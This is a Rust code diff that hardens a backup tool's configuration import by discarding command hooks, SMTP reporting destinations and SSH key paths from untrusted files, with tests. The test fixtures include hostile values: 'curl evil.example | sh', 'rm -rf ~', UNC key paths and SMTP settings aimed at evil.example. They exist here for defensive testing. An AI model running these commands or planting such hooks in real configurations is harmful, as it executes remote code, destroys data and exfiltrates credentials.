@@ -8,7 +8,7 @@ use serde_json::json;
 use zip::write::SimpleFileOptions;
 
 use crate::history;
-use crate::profiles::{self, PROFILE_SCHEMA_VERSION, Profile, ProfilesData};
+use crate::profiles::{self, PROFILE_SCHEMA_VERSION, Profile, ProfilesData, ReportPreferences};
 use crate::redaction;
 
 pub const EXPORT_FORMAT_VERSION: u32 = 1;
@@ -34,6 +34,43 @@ pub struct ImportPreview {
     pub replaced: Vec<String>,
     pub removed: Vec<String>,
     pub active_profile: Option<String>,
+    /// Profiles whose imported pre/post-backup hooks were discarded.
+    pub hooks_cleared: Vec<String>,
+    /// Profiles whose imported reporting settings were reset to the disabled default.
+    pub reporting_reset: Vec<String>,
+}
+
+/// Names of profiles touched by [`sanitize_imported_profiles`].
+#[derive(Debug, Default)]
+struct Sanitized {
+    hooks_cleared: Vec<String>,
+    reporting_reset: Vec<String>,
+}
+
+/// Imported files are untrusted: strip everything that executes commands, points
+/// at a credential-bearing destination, or names a local key path.
+/// - Hooks run arbitrary shell commands.
+/// - Reporting destinations (SMTP host/user/recipient) would be combined with the
+///   keychain secret stored under the profile id, exfiltrating it.
+/// - `ssh_key_path` is stripped on export; a hostile value (e.g. a UNC path) must not be honored.
+fn sanitize_imported_profiles(data: &mut ProfilesData) -> Sanitized {
+    let mut report = Sanitized::default();
+    for profile in &mut data.profiles {
+        if profile.pre_backup.is_some() || profile.post_backup.is_some() {
+            report.hooks_cleared.push(profile.name.clone());
+        }
+        profile.pre_backup = None;
+        profile.post_backup = None;
+        if profile.reporting != ReportPreferences::default() {
+            report.reporting_reset.push(profile.name.clone());
+        }
+        profile.reporting = ReportPreferences::default();
+        profile.repo.ssh_key_path = None;
+        if let Some(secondary) = profile.secondary_repo.as_mut() {
+            secondary.ssh_key_path = None;
+        }
+    }
+    report
 }
 
 pub async fn export_configuration(config_dir: &Path, destination: &Path) -> Result<(), String> {
@@ -46,7 +83,7 @@ pub async fn export_configuration(config_dir: &Path, destination: &Path) -> Resu
 }
 
 pub async fn preview_import(config_dir: &Path, source: &Path) -> Result<ImportPreview, String> {
-    let imported = read_and_validate_import(source).await?;
+    let (imported, sanitized) = read_and_validate_import(source).await?;
     let current = profiles::load(config_dir).await?;
     let current_ids: HashSet<_> = current.profiles.iter().map(|p| p.id.as_str()).collect();
     let imported_ids: HashSet<_> = imported
@@ -76,11 +113,13 @@ pub async fn preview_import(config_dir: &Path, source: &Path) -> Result<ImportPr
         replaced,
         removed,
         active_profile: imported.configuration.active_id,
+        hooks_cleared: sanitized.hooks_cleared,
+        reporting_reset: sanitized.reporting_reset,
     })
 }
 
 pub async fn import_configuration(config_dir: &Path, source: &Path) -> Result<(), String> {
-    let imported = read_and_validate_import(source).await?;
+    let (imported, _) = read_and_validate_import(source).await?;
     tokio::fs::create_dir_all(config_dir)
         .await
         .map_err(|e| e.to_string())?;
@@ -210,18 +249,15 @@ fn bundle_profiles(data: ProfilesData) -> ProfilesData {
     data
 }
 
-async fn read_and_validate_import(source: &Path) -> Result<ConfigurationExport, String> {
+async fn read_and_validate_import(
+    source: &Path,
+) -> Result<(ConfigurationExport, Sanitized), String> {
     let json = tokio::fs::read_to_string(source)
         .await
         .map_err(|e| e.to_string())?;
     let mut document: ConfigurationExport =
         serde_json::from_str(&json).map_err(|e| format!("invalid configuration export: {e}"))?;
-    // Hooks run arbitrary shell commands, so hooks embedded in an imported
-    // file are DISARMED, exactly as `import_profile` does.
-    for profile in &mut document.configuration.profiles {
-        profile.pre_backup = None;
-        profile.post_backup = None;
-    }
+    let sanitized = sanitize_imported_profiles(&mut document.configuration);
     if document.metadata.format_version != EXPORT_FORMAT_VERSION {
         return Err(format!(
             "unsupported configuration format version {}",
@@ -229,7 +265,7 @@ async fn read_and_validate_import(source: &Path) -> Result<ConfigurationExport, 
         ));
     }
     validate_profiles(&document.configuration)?;
-    Ok(document)
+    Ok((document, sanitized))
 }
 
 fn validate_profiles(data: &ProfilesData) -> Result<(), String> {
@@ -439,31 +475,106 @@ mod tests {
         );
     }
 
-    #[tokio::test]
-    async fn import_configuration_disarms_pre_and_post_backup_hooks() {
-        let source = tempfile::tempdir().unwrap();
-        let destination = tempfile::tempdir().unwrap();
-        let export_path = source.path().join("configuration.json");
-        let mut hostile = profile("work", "Work");
-        hostile.pre_backup = Some("curl evil.example | sh".into());
-        hostile.post_backup = Some("rm -rf ~".into());
+    async fn write_export(path: &Path, profiles: Vec<Profile>) {
+        let active_id = profiles.first().map(|p| p.id.clone());
         let document = ConfigurationExport {
             metadata: metadata(),
             configuration: ProfilesData {
                 schema_version: PROFILE_SCHEMA_VERSION,
-                profiles: vec![hostile],
-                active_id: Some("work".into()),
+                profiles,
+                active_id,
             },
         };
-        tokio::fs::write(&export_path, serde_json::to_vec_pretty(&document).unwrap())
+        tokio::fs::write(path, serde_json::to_vec_pretty(&document).unwrap())
             .await
             .unwrap();
+    }
 
-        import_configuration(destination.path(), &export_path)
+    fn hostile(id: &str, name: &str) -> Profile {
+        let mut p = profile(id, name);
+        p.pre_backup = Some("curl evil.example | sh".into());
+        p.post_backup = Some("calc.exe".into());
+        p.repo.ssh_key_path = Some(PathBuf::from(r"\\evil\share\key"));
+        let mut secondary = p.repo.clone();
+        secondary.repo_path = "/repo2".into();
+        secondary.ssh_key_path = Some(PathBuf::from(r"\\evil\share\key2"));
+        p.secondary_repo = Some(secondary);
+        p.reporting = ReportPreferences {
+            enabled: true,
+            smtp_enabled: true,
+            webhook_enabled: true,
+            smtp_host: "evil.example".into(),
+            smtp_username: "victim".into(),
+            email_from: "a@evil.example".into(),
+            email_to: "a@evil.example".into(),
+            ..Default::default()
+        };
+        p
+    }
+
+    #[tokio::test]
+    async fn import_configuration_sanitizes_every_profile() {
+        let source = tempfile::tempdir().unwrap();
+        let destination = tempfile::tempdir().unwrap();
+        let path = source.path().join("configuration.json");
+        write_export(&path, vec![hostile("a", "A"), hostile("b", "B")]).await;
+
+        import_configuration(destination.path(), &path)
             .await
             .unwrap();
         let imported = profiles::load(destination.path()).await.unwrap();
-        assert!(imported.profiles[0].pre_backup.is_none());
-        assert!(imported.profiles[0].post_backup.is_none());
+        assert_eq!(imported.profiles.len(), 2);
+        for p in &imported.profiles {
+            assert!(p.pre_backup.is_none(), "{}", p.name);
+            assert!(p.post_backup.is_none(), "{}", p.name);
+            assert!(p.repo.ssh_key_path.is_none(), "{}", p.name);
+            assert!(p.secondary_repo.as_ref().unwrap().ssh_key_path.is_none());
+            assert_eq!(p.reporting, ReportPreferences::default(), "{}", p.name);
+        }
+    }
+
+    #[tokio::test]
+    async fn import_over_existing_id_does_not_keep_reporting_destination() {
+        let source = tempfile::tempdir().unwrap();
+        let destination = tempfile::tempdir().unwrap();
+        let path = source.path().join("configuration.json");
+        let mut existing = profile("a", "A");
+        existing.reporting.smtp_host = "smtp.mine.example".into();
+        profiles::save(
+            destination.path(),
+            &ProfilesData {
+                schema_version: PROFILE_SCHEMA_VERSION,
+                profiles: vec![existing],
+                active_id: Some("a".into()),
+            },
+        )
+        .await
+        .unwrap();
+        write_export(&path, vec![hostile("a", "A")]).await;
+
+        import_configuration(destination.path(), &path)
+            .await
+            .unwrap();
+        let imported = profiles::load(destination.path()).await.unwrap();
+        let reporting = &imported.profiles[0].reporting;
+        assert!(!reporting.enabled && !reporting.smtp_enabled && !reporting.webhook_enabled);
+        assert!(reporting.smtp_host.is_empty() && reporting.email_to.is_empty());
+        assert!(reporting.smtp_username.is_empty());
+    }
+
+    #[tokio::test]
+    async fn preview_reports_cleared_hooks_and_reset_reporting() {
+        let source = tempfile::tempdir().unwrap();
+        let destination = tempfile::tempdir().unwrap();
+        let path = source.path().join("configuration.json");
+        write_export(
+            &path,
+            vec![hostile("a", "A"), profile("b", "B"), hostile("c", "C")],
+        )
+        .await;
+
+        let preview = preview_import(destination.path(), &path).await.unwrap();
+        assert_eq!(preview.hooks_cleared, vec!["A", "C"]);
+        assert_eq!(preview.reporting_reset, vec!["A", "C"]);
     }
 }
